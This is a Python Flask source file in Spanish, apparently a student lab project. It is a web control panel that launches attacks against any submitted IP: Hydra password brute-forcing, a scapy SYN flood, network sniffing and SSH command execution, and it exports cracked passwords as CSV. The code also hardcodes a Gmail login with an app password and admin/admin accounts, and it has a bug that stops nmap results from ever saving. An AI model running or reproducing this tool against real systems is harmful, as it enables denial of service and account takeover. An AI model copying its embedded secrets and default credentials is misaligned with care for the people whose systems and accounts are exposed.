from flask import Flask, render_template, request, redirect, url_for, copy_current_request_context
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
import subprocess, os, sqlite3, threading, random, time, smtplib
from scapy.all import sniff, IP, TCP, UDP, send
from werkzeug.security import generate_password_hash, check_password_hash
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import paramiko
from flask import send_file, abort
import io
import csv

app = Flask(__name__)
app.secret_key = 'clave_secreta_aleatoria_segura'
DB_PATH = "/var/lib/grafana/resultados.db"

# ---- LOGIN ----
login_manager = LoginManager(app)
login_manager.login_view = 'login'

class User(UserMixin):
    def __init__(self, id, username, password_hash, role):
        self.id = id
        self.username = username
        self.password_hash = password_hash
        self.role = role

users = {
    1: User(1, 'admin', generate_password_hash('admin'), 'admin'),
    2: User(2, 'user', generate_password_hash('user'), 'user')
}

@login_manager.user_loader
def load_user(user_id):
    return users.get(int(user_id))

# ---- EMAIL CONFIG ----
EMAIL_FROM = "avisosataquesproyectoasir@gmail.com"
EMAIL_PASS = "hopr tkbe pfse omus"
EMAIL_TO = "avisosataquesproyectoasir@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

def send_alert(tipo, ip):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_FROM
    msg['To'] = EMAIL_TO
    msg['Subject'] = f"[ALERTA] Nuevo ataque iniciado"
    body = f"""
    <p>El usuario <strong>{current_user.username}</strong> ha iniciado un ataque <b>{tipo}</b> contra la IP <b>{ip}</b>.</p>
    <p>Fecha y hora: {datetime.now()}</p>
    """
    msg.attach(MIMEText(body, 'html'))
    try:
        smtp = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        smtp.starttls()
        smtp.login(EMAIL_FROM, EMAIL_PASS)
        smtp.send_message(msg)
        smtp.quit()
    except Exception as e:
        print(f"[ERROR EMAIL] {e}")

def send_alert_denegado(tipo):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_FROM
    msg['To'] = EMAIL_TO
    msg['Subject'] = f"[ALERTA] Intento denegado de ataque"
    body = f"""
    <p>El usuario <strong>{current_user.username}</strong> ha intentado usar un ataque <b>{tipo}</b> sin permisos.</p>
    <p>Fecha y hora: {datetime.now()}</p>
    """
    msg.attach(MIMEText(body, 'html'))
    try:
        smtp = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        smtp.starttls()
        smtp.login(EMAIL_FROM, EMAIL_PASS)
        smtp.send_message(msg)
        smtp.quit()
    except Exception as e:
        print(f"[ERROR EMAIL] {e}")

# ---- FUNCIONES COMUNES ----
def obtener_diccionarios():
    d = "/home/kali/Proyecto-ASIR2/diccionarios"
    try:
        return [f for f in os.listdir(d) if f.endswith(('.txt','.lst'))]
    except:
        return []

# ---- NMAP ----
def run_nmap(ip):
    try:
        out = subprocess.check_output(["nmap", "-sV", ip], stderr=subprocess.STDOUT)
        result = parse_nmap_output(out.decode())
        guardar_resultado_nmap(result, ip)
        send_alert("Nmap", ip)
        return result
    except subprocess.CalledProcessError as e:
        return {"error": e.output.decode(), "raw_output": e.output.decode()}

def parse_nmap_output(output):
    data = {"host": "", "estado": "", "puertos": [], "mac": "", "raw_output": output}
    for line in output.splitlines():
        if "Nmap scan report for" in line:
            data["host"] = line.split("for")[1].strip()
        elif "Host is up" in line:
            data["estado"] = "Activo"
        elif "MAC Address:" in line:
            data["mac"] = line.split("MAC Address:")[1].strip()
        elif "/tcp" in line and "open" in line:
            p = line.split()
            data["puertos"].append({
	        "puerto": p[0],
    		"estado": p[1],
    	    	"servicio": p[2],
 	    	"version": " ".join(p[3:]) if len(p) > 3 else ""
	    })

    return data

def guardar_resultado_nmap(result, ip):
    if not result.get("ports"): return
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        for port in result["ports"]:
            c.execute("INSERT INTO nmap_resultados(ip, puerto, servicio, version) VALUES(?,?,?,?)",
                      (result["host"], port["port"], port["service"], port["version"]))
        c.execute("INSERT INTO ataques_realizados(ip, tipo_ataque) VALUES(?,?)", (ip, "nmap"))
        conn.commit(); conn.close()
    except sqlite3.Error as e:
        print(f"[SQLITE NMAP] {e}")

# ---- HYDRA ----
def run_hydra(ip, dicc, user, proto):
    path = os.path.join("/home/kali/Proyecto-ASIR2/diccionarios", dicc)
    if not os.path.exists(path):
        return {"error": "Diccionario no existe", "raw_output": ""}
    cmd = ["hydra", "-l", user, "-P", path, f"{proto}://{ip}", "-t", "4", "-vV"]
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
        result = parse_hydra_output(out.decode())
        guardar_resultado_hydra(result, ip)
        send_alert("Hydra", ip)
        return result
    except subprocess.CalledProcessError as e:
        return {"error": "Hydra falló", "raw_output": e.output.decode()}

def parse_hydra_output(output):
    for line in output.splitlines():
        if "login:" in line and "password:" in line:
            parts = line.split()
            return {
                "host": parts[parts.index("host:")+1],
                "port": parts[0].strip("[]"),
                "login": parts[parts.index("login:")+1],
                "password": parts[parts.index("password:")+1],
                "raw_output": output
            }
    return {"error": "No credenciales", "raw_output": output}

def guardar_resultado_hydra(result, ip):
    if result.get("error"): return
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO hydra_resultados(ip, puerto, usuario, password, protocolo) VALUES(?,?,?,?,?)",
                  (result["host"], result["port"], result["login"], result["password"], "ssh"))
        c.execute("INSERT INTO ataques_realizados(ip, tipo_ataque, puerto) VALUES(?,?,?)",
                  (ip, "hydra", result["port"]))
        conn.commit(); conn.close()
    except sqlite3.Error as e:
        print(f"[SQLITE HYDRA] {e}")

# ---- SYN FLOOD ----
def syn_flood_attack(ip, puerto, duracion):
    from scapy.layers.inet import IP, TCP
    print(f"[DEBUG] Iniciando SYN Flood hacia {ip}:{puerto} durante {duracion}s")
    end = time.time() + int(duracion)
    while time.time() < end:
        pkt = IP(dst=ip)/TCP(sport=random.randint(1024,65535), dport=int(puerto), flags='S')
        send(pkt, verbose=False)

def start_syn_flood(ip, puerto, duracion):
    print(f"[DEBUG] Lanzando hilo SYN Flood contra {ip}:{puerto}")
    thread = threading.Thread(target=syn_flood_attack, args=(ip, puerto, duracion))
    thread.daemon = True
    thread.start()
    guardar_resultado_syn(ip, puerto)
    send_alert("SYN Flood", ip)

def guardar_resultado_syn(ip, puerto):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO ataques_realizados(ip, tipo_ataque, puerto) VALUES(?,?,?)",
                  (ip, "syn_flood", puerto))
        conn.commit(); conn.close()
    except sqlite3.Error as e:
        print(f"[SQLITE SYN] {e}")

# ---- SNIFFING ----
sniff_data = []

def packet_handler(pkt):
    if IP in pkt:
        proto = "TCP" if TCP in pkt else "UDP" if UDP in pkt else "Otro"
        sniff_data.append({
            "src": pkt[IP].src,
            "dst": pkt[IP].dst,
            "proto": proto
        })

def start_sniffing(interface, duracion):
    sniff_data.clear()
    sniff(iface=interface, prn=packet_handler, timeout=int(duracion), store=False)
    guardar_resultado_sniffing()
    send_alert("Sniffing", interface)

def guardar_resultado_sniffing():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        for pkt in sniff_data:
            c.execute("INSERT INTO sniffing_resultados(src_ip, dst_ip, protocolo) VALUES(?,?,?)",
                      (pkt["src"], pkt["dst"], pkt["proto"]))
        # También guardamos el ataque en ataques_realizados (sin puerto específico)
        c.execute("INSERT INTO ataques_realizados(ip, tipo_ataque) VALUES(?,?)",
                  ("interfaz_sniffing", "sniffing"))
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        print(f"[SQLITE SNIFFING] {e}")

# ---- SSH Escaneo Interfaz ----
def escanear_interfaz_ssh(ip, ssh_user, ssh_pass):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=ssh_user, password=ssh_pass, timeout=5)
        stdin, stdout, stderr = ssh.exec_command("ip a")
        salida = stdout.read().decode()
        ssh.close()
        guardar_ataque(ip, "interface_scan", None)
        send_alert("Escaneo de interfaz de red (SSH)", ip)
        return salida
    except Exception as e:
        return f"Error SSH: {e}"

def guardar_ataque(ip, tipo_ataque, puerto=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO ataques_realizados(ip, tipo_ataque, puerto) VALUES(?,?,?)",
                  (ip, tipo_ataque, puerto))
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        print(f"[SQLITE ATAQUE] {e}")

# ---- FLASK ROUTES ----
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = next((u for u in users.values() if u.username == username), None)
        if user and check_password_hash(user.password_hash, password):
            login_user(user)
            return redirect(url_for('index'))
        return render_template('login.html', error='Credenciales inválidas')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route("/", methods=["GET", "POST"])
@login_required
def index():
    result = None
    hydra_result = None
    ssh_result = None
    message = None
    if request.method == "POST":
        ip = request.form["ip"]
        tipo = request.form["tipo_ataque"]
        if tipo == "nmap":
            result = run_nmap(ip)
        elif tipo == "hydra":
            if current_user.role != "admin":
                send_alert_denegado("Hydra")
                message = "❌ No tienes permisos para ejecutar Hydra."
            else:
                dicc = request.form["diccionario"]
                usuario = request.form["usuario"]
                proto = request.form["protocolo"]
                hydra_result = run_hydra(ip, dicc, usuario, proto)
        elif tipo == "syn_flood":
            if current_user.role != "admin":
                send_alert_denegado("SYN Flood")
                message = "❌ No tienes permisos para ejecutar SYN Flood."
            else:
                puerto = request.form["puerto"]
                duracion = request.form["duracion"]

                @copy_current_request_context
                def lanzar_syn_flood():
                    start_syn_flood(ip, puerto, duracion)

                threading.Thread(target=lanzar_syn_flood).start()
                message = f"✅ Ataque SYN Flood iniciado contra {ip} en puerto {puerto} por {duracion} segundos."
        elif tipo == "sniff":
            if current_user.role != "admin":
                send_alert_denegado("Sniffing")
                message = "❌ No tienes permisos para ejecutar Sniffing."
            else:
                interfaz = request.form["interfaz"]
                duracion = request.form["duracion"]

                @copy_current_request_context
                def lanzar_sniffing():
                    start_sniffing(interfaz, duracion)

                threading.Thread(target=lanzar_sniffing).start()
                message = f"✅ Sniffing iniciado en interfaz {interfaz} durante {duracion} segundos."
        elif tipo == "ssh_ip":
            ssh_user = request.form["ssh_user"]
            ssh_pass = request.form["ssh_pass"]
            ssh_result = escanear_interfaz_ssh(ip, ssh_user, ssh_pass)
    diccionarios = obtener_diccionarios()
    return render_template("index.html",
                           result=result,
                           hydra_result=hydra_result,
                           ssh_result=ssh_result,
                           diccionarios=diccionarios,
                           message=message,
                           role=current_user.role,
                           username=current_user.username)

# NUEVA RUTA PARA DASHBOARDS
@app.route('/dashboards')
@login_required
def dashboards():
    return render_template('grafana.html', username=current_user.username)

# Botón descargar passwords
@app.route('/download_passwords')
@login_required
def download_passwords():
    if current_user.role != 'admin':
        abort(403)
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT ip, puerto, usuario, password, protocolo FROM hydra_resultados")
        rows = c.fetchall()
        conn.close()
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(['IP', 'Puerto', 'Usuario', 'Contraseña', 'Protocolo'])
        writer.writerows(rows)
        output.seek(0)
        return send_file(
            io.BytesIO(output.getvalue().encode('utf-8')),
            mimetype='text/csv',
            as_attachment=True,
            download_name='contraseñas_hydra.csv'
        )
    except Exception as e:
        return f"Error al generar archivo: {e}", 500

# Página error 403
@app.errorhandler(403)
def forbidden(e):
    return render_template('403.html'), 403

if __name__ == "__main__":
    app.run(debug=True)
